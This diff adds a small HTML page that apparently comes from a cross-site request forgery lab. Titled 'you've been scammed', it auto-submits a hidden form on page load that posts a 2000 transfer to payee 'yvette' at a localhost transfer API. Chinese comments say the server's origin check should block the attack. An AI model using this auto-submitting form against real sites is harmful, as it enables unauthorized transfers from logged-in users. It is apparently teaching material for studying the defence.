@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>你被骗了</title>
+</head>
+
+<body>
+    <!-- 判断来源的接口 -->
+    <!-- 虽然用户已经登录，但是需要服务端会判断请求的来源，来源错误，不能转走钱 -->
+    <form name="sneak1" action="http://localhost:3001/api/transfer2" method="post">
+        <input type="text" name="payee" value="yvette" />
+        <input type="text" name="amount" value="2000" />
+    </form>
+</body>
+<script>
+    window.onload = function () {
+        document.sneak1.submit();   //有验证码的情况
+    }
+</script>
+
+</html>
